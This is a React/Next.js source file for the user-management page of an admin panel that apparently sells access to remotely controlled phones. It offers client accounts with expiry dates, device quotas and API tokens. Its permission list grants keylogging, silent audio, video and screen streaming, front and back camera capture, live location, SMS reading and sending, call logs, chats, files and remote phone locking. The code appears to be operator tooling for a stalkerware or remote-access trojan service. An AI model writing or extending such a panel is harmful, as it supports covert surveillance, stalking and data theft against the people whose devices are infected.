'use client';

import { useState, useEffect, useCallback, Suspense } from 'react';
import { useRouter } from 'next/navigation';
import Sidebar from '@/components/layout/Sidebar';
import Header from '@/components/layout/Header';
import { useAuthStore, PERMISSIONS } from '@/lib/store';
import {
    getUsers,
    createUser,
    updateUser,
    deleteUser,
    getUserSessions,
    revokeAllUserSessions,
    getAvailablePermissions,
    getDevices,
    assignDeviceToUser,
    unassignDeviceFromUser,
    generateUserApiToken
} from '@/lib/api';
import {
    Users,
    UserPlus,
    Shield,
    ShieldCheck,
    Clock,
    Smartphone,
    Key,
    Trash2,
    Edit2,
    X,
    Check,
    AlertCircle,
    Loader2,
    Calendar,
    Eye,
    EyeOff,
    RefreshCw,
    Ban,
    CheckCircle,
    XCircle,
    MonitorSmartphone,
    LogOut,
    MapPin,
    Image,
    Camera,
    Mic,
    Monitor,
    Terminal,
    ChevronDown,
    ChevronRight,
    ToggleLeft,
    ToggleRight,
    Copy,
    // New icons for permissions
    MessageSquare,
    Phone,
    Keyboard,
    Bell,
    MessageCircle,
    Video,
    Lock,
    FolderOpen,
    Settings,
    Send,
    Command,
    Zap
} from 'lucide-react';

interface UserData {
    id: string;
    username: string;
    email?: string;
    role: 'admin' | 'client';
    isActive: boolean;
    expiresAt?: string;
    permissions: string[];
    maxDevices: number;
    deviceCount: number;
    activeSessionCount: number;
    lastLoginAt?: string;
    createdAt: string;
    apiToken?: string;
}

interface PermissionInfo {
    code: string;
    name: string;
    description: string;
    category?: string;
}

interface CategoryInfo {
    id: string;
    name: string;
    icon: string;
}

export default function UsersPage() {
    return (
        <Suspense fallback={null}>
            <UsersPageContent />
        </Suspense>
    );
}

function UsersPageContent() {
    const router = useRouter();
    const { isAuthenticated, isHydrated, isAdmin, user: currentUser } = useAuthStore();
    const [users, setUsers] = useState<UserData[]>([]);
    const [loading, setLoading] = useState(true);
    const [permissions, setPermissions] = useState<PermissionInfo[]>([]);
    const [categories, setCategories] = useState<CategoryInfo[]>([]);
    const [devices, setDevices] = useState<any[]>([]);

    // Modal states
    const [showCreateModal, setShowCreateModal] = useState(false);
    const [showEditModal, setShowEditModal] = useState(false);
    const [showDevicesModal, setShowDevicesModal] = useState(false);
    const [selectedUser, setSelectedUser] = useState<UserData | null>(null);

    // Form states
    const [formData, setFormData] = useState({
        username: '',
        email: '',
        password: '',
        role: 'client' as 'admin' | 'client',
        isActive: true,
        expiresAt: '',
        permissions: [] as string[],
        maxDevices: 5
    });
    const [showPassword, setShowPassword] = useState(false);
    const [formError, setFormError] = useState('');
    const [formLoading, setFormLoading] = useState(false);
    const [permissionsTab, setPermissionsTab] = useState<'commands' | 'data'>('commands');

    // Token states
    const [generatingTokenFor, setGeneratingTokenFor] = useState<string | null>(null);
    const [copiedTokenFor, setCopiedTokenFor] = useState<string | null>(null);

    // Redirect if not authenticated or not admin
    useEffect(() => {
        if (isHydrated && (!isAuthenticated || !isAdmin)) {
            router.push('/');
        }
    }, [isHydrated, isAuthenticated, isAdmin, router]);

    const fetchUsers = useCallback(async () => {
        try {
            setLoading(true);
            const [usersData, permissionsData, devicesData] = await Promise.all([
                getUsers({ includeInactive: true }),
                getAvailablePermissions(),
                getDevices()
            ]);

            if (usersData.success) {
                setUsers(usersData.users);
            }
            if (permissionsData.success) {
                setPermissions(permissionsData.permissions.filter((p: PermissionInfo) => p.code !== '*'));
                if (permissionsData.categories) {
                    setCategories(permissionsData.categories);
                }
            }
            if (devicesData.success) {
                setDevices(devicesData.devices);
            }
        } catch (error) {
            console.error('Failed to fetch users:', error);
        } finally {
            setLoading(false);
        }
    }, []);

    useEffect(() => {
        if (isAuthenticated && isAdmin) {
            fetchUsers();
        }
    }, [isAuthenticated, isAdmin, fetchUsers]);

    const resetForm = () => {
        setFormData({
            username: '',
            email: '',
            password: '',
            role: 'client',
            isActive: true,
            expiresAt: '',
            permissions: [],
            maxDevices: 5
        });
        setShowPassword(false);
        setFormError('');
    };

    const handleCreateUser = async (e: React.FormEvent) => {
        e.preventDefault();
        setFormError('');
        setFormLoading(true);

        try {
            const data = await createUser({
                username: formData.username,
                password: formData.password,
                email: formData.email || undefined,
                role: formData.role,
                isActive: formData.isActive,
                expiresAt: formData.expiresAt || undefined,
                permissions: formData.role === 'admin' ? ['*'] : formData.permissions,
                maxDevices: formData.maxDevices
            });

            if (data.success) {
                setShowCreateModal(false);
                resetForm();
                fetchUsers();
            } else {
                setFormError(data.error || 'Failed to create user');
            }
        } catch (err: any) {
            setFormError(err.response?.data?.error || 'Failed to create user');
        } finally {
            setFormLoading(false);
        }
    };

    const handleEditUser = async (e: React.FormEvent) => {
        e.preventDefault();
        if (!selectedUser) return;

        setFormError('');
        setFormLoading(true);

        try {
            const updates: any = {
                email: formData.email || null,
                role: formData.role,
                isActive: formData.isActive,
                expiresAt: formData.expiresAt || null,
                permissions: formData.role === 'admin' ? ['*'] : formData.permissions,
                maxDevices: formData.maxDevices
            };

            if (formData.password) {
                updates.password = formData.password;
            }

            const data = await updateUser(selectedUser.id, updates);

            if (data.success) {
                setShowEditModal(false);
                resetForm();
                setSelectedUser(null);
                fetchUsers();
            } else {
                setFormError(data.error || 'Failed to update user');
            }
        } catch (err: any) {
            setFormError(err.response?.data?.error || 'Failed to update user');
        } finally {
            setFormLoading(false);
        }
    };

    const handleDeleteUser = async (userId: string, username: string) => {
        if (!confirm(`Are you sure you want to delete user "${username}"? Their devices will be unassigned.`)) {
            return;
        }

        try {
            await deleteUser(userId);
            fetchUsers();
        } catch (error) {
            console.error('Failed to delete user:', error);
        }
    };

    const handleRevokeAllSessions = async (userId: string, username: string) => {
        if (!confirm(`Revoke all sessions for "${username}"? They will need to login again.`)) {
            return;
        }

        try {
            await revokeAllUserSessions(userId);
            fetchUsers();
        } catch (error) {
            console.error('Failed to revoke sessions:', error);
        }
    };

    const handleGenerateToken = async (userId: string) => {
        setGeneratingTokenFor(userId);
        try {
            const result = await generateUserApiToken(userId);
            if (result.success) {
                fetchUsers();
            }
        } catch (error: any) {
            console.error('Failed to generate token:', error);
            alert(error.message || 'Failed to generate token');
        } finally {
            setGeneratingTokenFor(null);
        }
    };

    const handleCopyToken = async (token: string, userId: string) => {
        try {
            await navigator.clipboard.writeText(token);
            setCopiedTokenFor(userId);
            setTimeout(() => setCopiedTokenFor(null), 2000);
        } catch (error) {
            console.error('Failed to copy token:', error);
        }
    };

    const maskToken = (token: string) => {
        if (!token) return '';
        if (token.length <= 12) return token;
        return `${token.slice(0, 8)}...${token.slice(-4)}`;
    };

    const openEditModal = (user: UserData) => {
        setSelectedUser(user);
        setFormData({
            username: user.username,
            email: user.email || '',
            password: '',
            role: user.role,
            isActive: user.isActive,
            expiresAt: user.expiresAt ? new Date(user.expiresAt).toISOString().split('T')[0] : '',
            permissions: user.permissions.includes('*') ? permissions.map(p => p.code) : user.permissions,
            maxDevices: user.maxDevices
        });
        setShowEditModal(true);
    };

    const openDevicesModal = (user: UserData) => {
        setSelectedUser(user);
        setShowDevicesModal(true);
    };

    const handleAssignDevice = async (deviceId: string) => {
        if (!selectedUser) return;
        try {
            await assignDeviceToUser(selectedUser.id, deviceId);
            fetchUsers();
        } catch (error) {
            console.error('Failed to assign device:', error);
        }
    };

    const handleUnassignDevice = async (deviceId: string) => {
        if (!selectedUser) return;
        try {
            await unassignDeviceFromUser(selectedUser.id, deviceId);
            fetchUsers();
        } catch (error) {
            console.error('Failed to unassign device:', error);
        }
    };

    const togglePermission = (code: string) => {
        setFormData(prev => ({
            ...prev,
            permissions: prev.permissions.includes(code)
                ? prev.permissions.filter(p => p !== code)
                : [...prev.permissions, code]
        }));
    };

    const toggleCategoryPermissions = (categoryId: string) => {
        const categoryPerms = permissions.filter(p => p.category === categoryId).map(p => p.code);
        const allSelected = categoryPerms.every(code => formData.permissions.includes(code));

        setFormData(prev => ({
            ...prev,
            permissions: allSelected
                ? prev.permissions.filter(p => !categoryPerms.includes(p))
                : [...new Set([...prev.permissions, ...categoryPerms])]
        }));
    };

    const isCategoryFullySelected = (categoryId: string) => {
        const categoryPerms = permissions.filter(p => p.category === categoryId).map(p => p.code);
        return categoryPerms.length > 0 && categoryPerms.every(code => formData.permissions.includes(code));
    };

    const isCategoryPartiallySelected = (categoryId: string) => {
        const categoryPerms = permissions.filter(p => p.category === categoryId).map(p => p.code);
        const selectedCount = categoryPerms.filter(code => formData.permissions.includes(code)).length;
        return selectedCount > 0 && selectedCount < categoryPerms.length;
    };

    const selectAllPermissions = () => {
        setFormData(prev => ({
            ...prev,
            permissions: permissions.map(p => p.code)
        }));
    };

    const clearAllPermissions = () => {
        setFormData(prev => ({
            ...prev,
            permissions: []
        }));
    };

    // Group permissions by category
    const groupedPermissions = categories.length > 0 ? categories.map(cat => ({
        ...cat,
        permissions: permissions.filter(p => p.category === cat.id)
    })).filter(g => g.permissions.length > 0) : [];

    if (!isHydrated || !isAuthenticated || !isAdmin) return null;

    const userDevices = devices.filter(d => d.owner?.id === selectedUser?.id);
    const unassignedDevices = devices.filter(d => !d.owner);

    return (
        <div className="min-h-screen bg-[var(--bg-elevated)] pb-20 lg:pb-0">
            <Sidebar />
            <main className="lg:ml-72 lg:bg-[var(--bg-base)]">
                <Header title="User Management" subtitle="Manage users, permissions, and access" onRefresh={fetchUsers} />

                <div className="p-3 lg:px-8 lg:py-6 lg:max-w-7xl lg:mx-auto space-y-4">
                    {/* Stats Row */}
                    <div className="grid grid-cols-3 gap-3">
                        <div className="bg-white rounded-xl p-4 border border-[var(--border-light)]">
                            <div className="flex items-center gap-3">
                                <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-blue-500 to-cyan-400 flex items-center justify-center">
                                    <Users className="w-5 h-5 text-white" />
                                </div>
                                <div>
                                    <p className="text-2xl font-bold text-[var(--text-primary)]">{users.length}</p>
                                    <p className="text-xs text-[var(--text-muted)]">Total Users</p>
                                </div>
                            </div>
                        </div>
                        <div className="bg-white rounded-xl p-4 border border-[var(--border-light)]">
                            <div className="flex items-center gap-3">
                                <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-purple-500 to-pink-400 flex items-center justify-center">
                                    <ShieldCheck className="w-5 h-5 text-white" />
                                </div>
                                <div>
                                    <p className="text-2xl font-bold text-[var(--text-primary)]">
                                        {users.filter(u => u.role === 'admin').length}
                                    </p>
                                    <p className="text-xs text-[var(--text-muted)]">Admins</p>
                                </div>
                            </div>
                        </div>
                        <div className="bg-white rounded-xl p-4 border border-[var(--border-light)]">
                            <div className="flex items-center gap-3">
                                <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-emerald-500 to-teal-400 flex items-center justify-center">
                                    <CheckCircle className="w-5 h-5 text-white" />
                                </div>
                                <div>
                                    <p className="text-2xl font-bold text-[var(--text-primary)]">
                                        {users.filter(u => u.isActive).length}
                                    </p>
                                    <p className="text-xs text-[var(--text-muted)]">Active</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    {/* Create User Button */}
                    <button
                        onClick={() => { resetForm(); setShowCreateModal(true); }}
                        className="w-full py-3 rounded-xl bg-gradient-to-r from-[var(--aurora-violet)] to-[var(--aurora-purple)] text-white font-semibold flex items-center justify-center gap-2 shadow-lg"
                    >
                        <UserPlus className="w-5 h-5" />
                        Create New User
                    </button>

                    {/* Users List */}
                    <div className="space-y-3">
                        {loading ? (
                            <div className="flex justify-center py-12">
                                <Loader2 className="w-8 h-8 animate-spin text-[var(--aurora-violet)]" />
                            </div>
                        ) : users.length === 0 ? (
                            <div className="text-center py-12 text-[var(--text-muted)]">
                                <Users className="w-12 h-12 mx-auto mb-3 opacity-50" />
                                <p>No users found</p>
                            </div>
                        ) : (
                            users.map(user => (
                                <div
                                    key={user.id}
                                    className={`bg-white rounded-xl p-4 border transition-all ${user.isActive ? 'border-[var(--border-light)]' : 'border-red-200 bg-red-50/50'
                                        }`}
                                >
                                    <div className="flex items-start justify-between">
                                        <div className="flex items-center gap-3">
                                            <div className={`w-12 h-12 rounded-xl flex items-center justify-center ${user.role === 'admin'
                                                ? 'bg-gradient-to-br from-purple-500 to-pink-400'
                                                : 'bg-gradient-to-br from-blue-500 to-cyan-400'
                                                }`}>
                                                {user.role === 'admin' ? (
                                                    <ShieldCheck className="w-6 h-6 text-white" />
                                                ) : (
                                                    <Shield className="w-6 h-6 text-white" />
                                                )}
                                            </div>
                                            <div>
                                                <div className="flex items-center gap-2">
                                                    <h3 className="font-bold text-[var(--text-primary)]">{user.username}</h3>
                                                    <span className={`text-xs px-2 py-0.5 rounded-full font-medium ${user.role === 'admin'
                                                        ? 'bg-purple-100 text-purple-700'
                                                        : 'bg-blue-100 text-blue-700'
                                                        }`}>
                                                        {user.role}
                                                    </span>
                                                    {!user.isActive && (
                                                        <span className="text-xs px-2 py-0.5 rounded-full bg-red-100 text-red-700 font-medium">
                                                            Disabled
                                                        </span>
                                                    )}
                                                </div>
                                                {user.email && (
                                                    <p className="text-sm text-[var(--text-muted)]">{user.email}</p>
                                                )}
                                                <div className="flex items-center gap-3 mt-1 text-xs text-[var(--text-muted)]">
                                                    <span className="flex items-center gap-1">
                                                        <Smartphone className="w-3 h-3" />
                                                        {user.deviceCount}/{user.maxDevices} devices
                                                    </span>
                                                    {user.expiresAt && (
                                                        <span className="flex items-center gap-1">
                                                            <Clock className="w-3 h-3" />
                                                            Expires {new Date(user.expiresAt).toLocaleDateString()}
                                                        </span>
                                                    )}
                                                </div>
                                            </div>
                                        </div>

                                        <div className="flex items-center gap-2">
                                            <button
                                                onClick={() => openDevicesModal(user)}
                                                className="p-2 rounded-lg hover:bg-[var(--bg-subtle)] text-[var(--text-muted)] hover:text-[var(--text-primary)] transition-colors"
                                                title="Manage Devices"
                                            >
                                                <MonitorSmartphone className="w-4 h-4" />
                                            </button>
                                            <button
                                                onClick={() => handleRevokeAllSessions(user.id, user.username)}
                                                className="p-2 rounded-lg hover:bg-[var(--bg-subtle)] text-[var(--text-muted)] hover:text-orange-500 transition-colors"
                                                title="Revoke All Sessions"
                                            >
                                                <LogOut className="w-4 h-4" />
                                            </button>
                                            <button
                                                onClick={() => openEditModal(user)}
                                                className="p-2 rounded-lg hover:bg-[var(--bg-subtle)] text-[var(--text-muted)] hover:text-[var(--aurora-violet)] transition-colors"
                                                title="Edit User"
                                            >
                                                <Edit2 className="w-4 h-4" />
                                            </button>
                                            {user.id !== currentUser?.id && (
                                                <button
                                                    onClick={() => handleDeleteUser(user.id, user.username)}
                                                    className="p-2 rounded-lg hover:bg-red-50 text-[var(--text-muted)] hover:text-red-500 transition-colors"
                                                    title="Delete User"
                                                >
                                                    <Trash2 className="w-4 h-4" />
                                                </button>
                                            )}
                                        </div>
                                    </div>

                                    {/* Permissions Preview */}
                                    {user.role === 'client' && user.permissions.length > 0 && (
                                        <div className="mt-3 flex flex-wrap gap-1">
                                            {user.permissions.slice(0, 6).map(perm => (
                                                <span key={perm} className="text-xs px-2 py-0.5 rounded bg-[var(--bg-subtle)] text-[var(--text-muted)]">
                                                    {perm}
                                                </span>
                                            ))}
                                            {user.permissions.length > 6 && (
                                                <span className="text-xs px-2 py-0.5 rounded bg-[var(--bg-subtle)] text-[var(--text-muted)]">
                                                    +{user.permissions.length - 6} more
                                                </span>
                                            )}
                                        </div>
                                    )}
                                    {user.role === 'admin' && (
                                        <div className="mt-3">
                                            <span className="text-xs px-2 py-0.5 rounded bg-purple-100 text-purple-700">
                                                All Permissions
                                            </span>
                                        </div>
                                    )}

                                    {/* API Token Section */}
                                    <div className="mt-3 pt-3 border-t border-[var(--border-light)]">
                                        <div className="flex items-center justify-between">
                                            <div className="flex items-center gap-2">
                                                <Key className="w-4 h-4 text-[var(--text-muted)]" />
                                                <span className="text-xs font-medium text-[var(--text-muted)]">API Token</span>
                                            </div>
                                            {user.apiToken ? (
                                                <div className="flex items-center gap-2">
                                                    <code className="text-xs bg-[var(--bg-subtle)] px-2 py-1 rounded font-mono text-[var(--text-secondary)]">
                                                        {maskToken(user.apiToken)}
                                                    </code>
                                                    <button
                                                        onClick={() => handleCopyToken(user.apiToken!, user.id)}
                                                        className={`p-1.5 rounded-lg transition-colors ${copiedTokenFor === user.id
                                                            ? 'bg-emerald-100 text-emerald-600'
                                                            : 'hover:bg-[var(--bg-subtle)] text-[var(--text-muted)] hover:text-[var(--text-primary)]'
                                                            }`}
                                                        title={copiedTokenFor === user.id ? 'Copied!' : 'Copy Token'}
                                                    >
                                                        {copiedTokenFor === user.id ? (
                                                            <Check className="w-3.5 h-3.5" />
                                                        ) : (
                                                            <Copy className="w-3.5 h-3.5" />
                                                        )}
                                                    </button>
                                                </div>
                                            ) : (
                                                <button
                                                    onClick={() => handleGenerateToken(user.id)}
                                                    disabled={generatingTokenFor === user.id}
                                                    className="px-2.5 py-1 text-xs bg-gradient-to-r from-[var(--aurora-violet)] to-[var(--aurora-purple)] text-white rounded-lg font-medium disabled:opacity-50 flex items-center gap-1"
                                                >
                                                    {generatingTokenFor === user.id ? (
                                                        <>
                                                            <Loader2 className="w-3 h-3 animate-spin" />
                                                            Generating...
                                                        </>
                                                    ) : (
                                                        <>
                                                            <Key className="w-3 h-3" />
                                                            Generate
                                                        </>
                                                    )}
                                                </button>
                                            )}
                                        </div>
                                        {user.apiToken && (
                                            <p className="text-[10px] text-[var(--text-muted)] mt-1">
                                                Permanent token • Cannot be changed
                                            </p>
                                        )}
                                    </div>
                                </div>
                            ))
                        )}
                    </div>
                </div>
            </main>

            {/* Create User Modal */}
            {showCreateModal && (
                <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
                    <div className="bg-white rounded-2xl w-full max-w-lg max-h-[90vh] overflow-y-auto">
                        <div className="p-6 border-b border-[var(--border-light)]">
                            <div className="flex items-center justify-between">
                                <h2 className="text-xl font-bold text-[var(--text-primary)]">Create New User</h2>
                                <button onClick={() => setShowCreateModal(false)} className="p-2 hover:bg-[var(--bg-subtle)] rounded-lg">
                                    <X className="w-5 h-5" />
                                </button>
                            </div>
                        </div>

                        <form onSubmit={handleCreateUser} className="p-6 space-y-4">
                            {formError && (
                                <div className="flex items-center gap-2 p-3 rounded-lg bg-red-50 text-red-600 text-sm">
                                    <AlertCircle className="w-4 h-4" />
                                    {formError}
                                </div>
                            )}

                            <div>
                                <label className="block text-sm font-medium mb-1">Username *</label>
                                <input
                                    type="text"
                                    value={formData.username}
                                    onChange={e => setFormData({ ...formData, username: e.target.value })}
                                    className="input"
                                    required
                                    minLength={3}
                                />
                            </div>

                            <div>
                                <label className="block text-sm font-medium mb-1">Email</label>
                                <input
                                    type="email"
                                    value={formData.email}
                                    onChange={e => setFormData({ ...formData, email: e.target.value })}
                                    className="input"
                                />
                            </div>

                            <div>
                                <label className="block text-sm font-medium mb-1">Password *</label>
                                <div className="relative">
                                    <input
                                        type={showPassword ? 'text' : 'password'}
                                        value={formData.password}
                                        onChange={e => setFormData({ ...formData, password: e.target.value })}
                                        className="input pr-10"
                                        required
                                        minLength={6}
                                    />
                                    <button
                                        type="button"
                                        onClick={() => setShowPassword(!showPassword)}
                                        className="absolute right-3 top-1/2 -translate-y-1/2 text-[var(--text-muted)]"
                                    >
                                        {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                                    </button>
                                </div>
                            </div>

                            <div className="grid grid-cols-2 gap-4">
                                <div>
                                    <label className="block text-sm font-medium mb-1">Role</label>
                                    <select
                                        value={formData.role}
                                        onChange={e => setFormData({ ...formData, role: e.target.value as 'admin' | 'client' })}
                                        className="input"
                                    >
                                        <option value="client">Client</option>
                                        <option value="admin">Admin</option>
                                    </select>
                                </div>
                                <div>
                                    <label className="block text-sm font-medium mb-1">Max Devices</label>
                                    <input
                                        type="number"
                                        value={formData.maxDevices}
                                        onChange={e => setFormData({ ...formData, maxDevices: parseInt(e.target.value) })}
                                        className="input"
                                        min={1}
                                        max={10000}
                                    />
                                </div>
                            </div>

                            <div>
                                <label className="block text-sm font-medium mb-1">Expiration Date</label>
                                <input
                                    type="date"
                                    value={formData.expiresAt}
                                    onChange={e => setFormData({ ...formData, expiresAt: e.target.value })}
                                    className="input"
                                    min={new Date().toISOString().split('T')[0]}
                                />
                                <p className="text-xs text-[var(--text-muted)] mt-1">Leave empty for no expiration</p>
                            </div>

                            <div className="flex items-center gap-2">
                                <input
                                    type="checkbox"
                                    id="isActive"
                                    checked={formData.isActive}
                                    onChange={e => setFormData({ ...formData, isActive: e.target.checked })}
                                    className="w-4 h-4 rounded"
                                />
                                <label htmlFor="isActive" className="text-sm">Active account</label>
                            </div>

                            {formData.role === 'client' && (
                                <div>
                                    <div className="flex items-center justify-between mb-3">
                                        <label className="block text-sm font-bold text-[var(--text-primary)]">Feature Permissions</label>
                                        <div className="flex gap-2">
                                            <button type="button" onClick={selectAllPermissions} className="text-xs px-2 py-1 rounded bg-[var(--aurora-violet)]/10 text-[var(--aurora-violet)] hover:bg-[var(--aurora-violet)]/20">
                                                Enable All
                                            </button>
                                            <button type="button" onClick={clearAllPermissions} className="text-xs px-2 py-1 rounded bg-gray-100 text-gray-600 hover:bg-gray-200">
                                                Disable All
                                            </button>
                                        </div>
                                    </div>

                                    {/* Tab Navigation */}
                                    <div className="flex gap-1 p-1 rounded-xl bg-[var(--bg-subtle)] border border-[var(--border-light)] mb-3">
                                        <button
                                            type="button"
                                            onClick={() => setPermissionsTab('commands')}
                                            className={`flex-1 flex items-center justify-center gap-1.5 px-3 py-2 rounded-lg font-semibold text-xs transition-all ${permissionsTab === 'commands'
                                                ? 'bg-white text-[var(--text-primary)] shadow-md'
                                                : 'text-[var(--text-muted)] hover:text-[var(--text-secondary)]'
                                                }`}
                                        >
                                            <Command className="w-3.5 h-3.5" />
                                            Quick Commands
                                        </button>
                                        <button
                                            type="button"
                                            onClick={() => setPermissionsTab('data')}
                                            className={`flex-1 flex items-center justify-center gap-1.5 px-3 py-2 rounded-lg font-semibold text-xs transition-all ${permissionsTab === 'data'
                                                ? 'bg-white text-[var(--text-primary)] shadow-md'
                                                : 'text-[var(--text-muted)] hover:text-[var(--text-secondary)]'
                                                }`}
                                        >
                                            <Image className="w-3.5 h-3.5" />
                                            Device Data
                                        </button>
                                    </div>

                                    {/* Permission configurations */}
                                    {(() => {
                                        const permConfig: Record<string, { icon: React.ComponentType<any>; gradient: string; category: 'commands' | 'data' }> = {
                                            // Quick Commands
                                            'screenshot': { icon: Monitor, gradient: 'from-blue-500 to-cyan-400', category: 'commands' },
                                            'camera_front': { icon: Camera, gradient: 'from-purple-500 to-pink-400', category: 'commands' },
                                            'camera_back': { icon: Camera, gradient: 'from-orange-500 to-amber-400', category: 'commands' },
                                            'location_live': { icon: MapPin, gradient: 'from-emerald-500 to-teal-400', category: 'commands' },
                                            'sms_sync': { icon: MessageSquare, gradient: 'from-pink-500 to-rose-400', category: 'commands' },
                                            'sms_send': { icon: Send, gradient: 'from-green-500 to-emerald-400', category: 'commands' },
                                            'calls_sync': { icon: Phone, gradient: 'from-cyan-500 to-blue-400', category: 'commands' },
                                            'contacts_sync': { icon: Users, gradient: 'from-indigo-500 to-purple-400', category: 'commands' },
                                            'commands': { icon: Command, gradient: 'from-indigo-500 to-purple-400', category: 'commands' },
                                            // Device Data
                                            'stream': { icon: Video, gradient: 'from-red-500 to-rose-400', category: 'data' },
                                            'stream_silent': { icon: Monitor, gradient: 'from-violet-500 to-purple-400', category: 'data' },
                                            'livestream': { icon: Video, gradient: 'from-red-500 to-rose-400', category: 'data' },
                                            'stream_video': { icon: Video, gradient: 'from-red-500 to-rose-400', category: 'data' },
                                            'stream_audio': { icon: Mic, gradient: 'from-purple-500 to-pink-400', category: 'data' },
                                            'stream_screen': { icon: Monitor, gradient: 'from-blue-500 to-cyan-400', category: 'data' },
                                            'stream_full': { icon: Video, gradient: 'from-red-600 to-rose-500', category: 'data' },
                                            'recordings': { icon: Mic, gradient: 'from-amber-500 to-yellow-400', category: 'data' },
                                            'sms': { icon: MessageSquare, gradient: 'from-blue-500 to-cyan-400', category: 'data' },
                                            'calls': { icon: Phone, gradient: 'from-emerald-500 to-teal-400', category: 'data' },
                                            'contacts': { icon: Users, gradient: 'from-purple-500 to-pink-400', category: 'data' },
                                            'keylogs': { icon: Keyboard, gradient: 'from-orange-500 to-amber-400', category: 'data' },
                                            'phone_lock': { icon: Lock, gradient: 'from-red-600 to-rose-500', category: 'data' },
                                            'notifications': { icon: Bell, gradient: 'from-pink-500 to-rose-400', category: 'data' },
                                            'gallery': { icon: Image, gradient: 'from-cyan-500 to-blue-400', category: 'data' },
                                            'photos': { icon: Image, gradient: 'from-cyan-500 to-blue-400', category: 'data' },
                                            'location': { icon: MapPin, gradient: 'from-yellow-500 to-orange-400', category: 'data' },
                                            'files': { icon: FolderOpen, gradient: 'from-indigo-500 to-purple-400', category: 'data' },
                                            'settings': { icon: Settings, gradient: 'from-slate-600 to-zinc-500', category: 'data' },
                                            'logs': { icon: Terminal, gradient: 'from-slate-500 to-gray-400', category: 'data' },
                                            'chat': { icon: MessageCircle, gradient: 'from-green-500 to-emerald-400', category: 'data' },
                                            'apps': { icon: Smartphone, gradient: 'from-slate-600 to-zinc-500', category: 'data' },
                                        };

                                        const filteredPerms = permissions.filter(perm => {
                                            const config = permConfig[perm.code];
                                            return config?.category === permissionsTab;
                                        });

                                        return (
                                            <div className="grid grid-cols-3 gap-2 max-h-[300px] overflow-y-auto pr-1">
                                                {filteredPerms.map(perm => {
                                                    const isEnabled = formData.permissions.includes(perm.code);
                                                    const config = permConfig[perm.code] || { icon: Zap, gradient: 'from-gray-500 to-slate-400', category: 'data' };
                                                    const Icon = config.icon;

                                                    return (
                                                        <button
                                                            key={perm.code}
                                                            type="button"
                                                            onClick={() => togglePermission(perm.code)}
                                                            className={`relative p-3 rounded-xl border-2 transition-all flex flex-col items-center gap-2 text-center ${isEnabled
                                                                ? 'bg-white border-[var(--aurora-violet)] shadow-md'
                                                                : 'bg-[var(--bg-subtle)] border-transparent opacity-60 hover:opacity-100'
                                                                }`}
                                                        >
                                                            {isEnabled && (
                                                                <div className="absolute top-1 right-1 w-5 h-5 rounded-full bg-[var(--aurora-violet)] flex items-center justify-center">
                                                                    <Check className="w-3 h-3 text-white" />
                                                                </div>
                                                            )}
                                                            <div className={`w-10 h-10 rounded-xl bg-gradient-to-br ${config.gradient} flex items-center justify-center shadow-lg ${isEnabled ? '' : 'grayscale opacity-50'
                                                                }`}>
                                                                <Icon className="w-5 h-5 text-white" />
                                                            </div>
                                                            <span className={`text-xs font-semibold leading-tight ${isEnabled ? 'text-[var(--text-primary)]' : 'text-[var(--text-muted)]'
                                                                }`}>
                                                                {perm.name}
                                                            </span>
                                                        </button>
                                                    );
                                                })}
                                            </div>
                                        );
                                    })()}

                                    <p className="text-xs text-[var(--text-muted)] mt-3 text-center">
                                        {formData.permissions.length} of {permissions.length} features enabled
                                    </p>
                                </div>
                            )}

                            <div className="flex gap-3 pt-4">
                                <button
                                    type="button"
                                    onClick={() => setShowCreateModal(false)}
                                    className="flex-1 py-3 rounded-xl border border-[var(--border-light)] font-medium"
                                >
                                    Cancel
                                </button>
                                <button
                                    type="submit"
                                    disabled={formLoading}
                                    className="flex-1 py-3 rounded-xl bg-gradient-to-r from-[var(--aurora-violet)] to-[var(--aurora-purple)] text-white font-medium disabled:opacity-50"
                                >
                                    {formLoading ? <Loader2 className="w-5 h-5 animate-spin mx-auto" /> : 'Create User'}
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            )}

            {/* Edit User Modal */}
            {showEditModal && selectedUser && (
                <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
                    <div className="bg-white rounded-2xl w-full max-w-lg max-h-[90vh] overflow-y-auto">
                        <div className="p-6 border-b border-[var(--border-light)]">
                            <div className="flex items-center justify-between">
                                <h2 className="text-xl font-bold text-[var(--text-primary)]">Edit User: {selectedUser.username}</h2>
                                <button onClick={() => { setShowEditModal(false); setSelectedUser(null); }} className="p-2 hover:bg-[var(--bg-subtle)] rounded-lg">
                                    <X className="w-5 h-5" />
                                </button>
                            </div>
                        </div>

                        <form onSubmit={handleEditUser} className="p-6 space-y-4">
                            {formError && (
                                <div className="flex items-center gap-2 p-3 rounded-lg bg-red-50 text-red-600 text-sm">
                                    <AlertCircle className="w-4 h-4" />
                                    {formError}
                                </div>
                            )}

                            <div>
                                <label className="block text-sm font-medium mb-1">Email</label>
                                <input
                                    type="email"
                                    value={formData.email}
                                    onChange={e => setFormData({ ...formData, email: e.target.value })}
                                    className="input"
                                />
                            </div>

                            <div>
                                <label className="block text-sm font-medium mb-1">New Password</label>
                                <div className="relative">
                                    <input
                                        type={showPassword ? 'text' : 'password'}
                                        value={formData.password}
                                        onChange={e => setFormData({ ...formData, password: e.target.value })}
                                        className="input pr-10"
                                        placeholder="Leave empty to keep current"
                                        minLength={6}
                                    />
                                    <button
                                        type="button"
                                        onClick={() => setShowPassword(!showPassword)}
                                        className="absolute right-3 top-1/2 -translate-y-1/2 text-[var(--text-muted)]"
                                    >
                                        {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                                    </button>
                                </div>
                            </div>

                            <div className="grid grid-cols-2 gap-4">
                                <div>
                                    <label className="block text-sm font-medium mb-1">Role</label>
                                    <select
                                        value={formData.role}
                                        onChange={e => setFormData({ ...formData, role: e.target.value as 'admin' | 'client' })}
                                        className="input"
                                        disabled={selectedUser.id === currentUser?.id}
                                    >
                                        <option value="client">Client</option>
                                        <option value="admin">Admin</option>
                                    </select>
                                </div>
                                <div>
                                    <label className="block text-sm font-medium mb-1">Max Devices</label>
                                    <input
                                        type="number"
                                        value={formData.maxDevices}
                                        onChange={e => setFormData({ ...formData, maxDevices: parseInt(e.target.value) })}
                                        className="input"
                                        min={1}
                                        max={10000}
                                    />
